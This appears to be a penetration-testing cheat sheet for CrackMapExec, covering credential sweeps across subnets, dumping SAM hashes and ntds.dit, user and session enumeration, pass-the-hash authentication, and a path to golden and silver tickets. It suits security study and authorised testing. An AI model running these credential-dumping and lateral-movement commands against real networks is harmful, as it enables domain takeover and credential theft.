



# CrackMapExec

Once we have access to a domain, CrackMapExec (CME) will allow us to sweep the network and see which users and machines we can access to.

CME allows us to authenticate ourselves with the following protocols:

- smb
- ssh
- mssql
- ldap
- winrm

The most used protocol is smb as port 445 is commonly open.

## Installation

```bash
sudo apt-get -y install crackmapexec
```


## Basic usage

Main syntax

```bash
crackmapexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```bash
# Check if we can access a machine
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN>

# Check which machines we can access in a subnet
crackmapexec smb $ip/24 -u <username> -p <password> -d <DOMAIN>

# Get sam: all users authenticated in the machine and their hashes
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sam

# Get the ntds.dit, given that your user has permissions
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --ntds

# See shares
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --shares

# Enumerate active sessions
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sessions

# Enumerate users of the domain
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --users

# Enumerate logged on users
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --loggedon-users

# Using a hash instead of a password, to authenticate ourselves
crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>
```

## Basic technique

Once we have access to  a domain:

1. Enumerate users and machines in our machine: we will have all users registered and their hashes. 

2. See if any user is in another machine of the domain. Also check if they have admin access.

3. Goal would be to dump ntds.dit.

With krbtgt and DC$ user you can get a golden ticket. And with DC$ a silver ticket.


## What is a SAM hash like?

Take the Administrator one:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Basically, it has 4 parts: 

					user : id: LM-authentication : NTLM

For the purpose of using the hash with CrackMapExec, we will user the NTLM part.






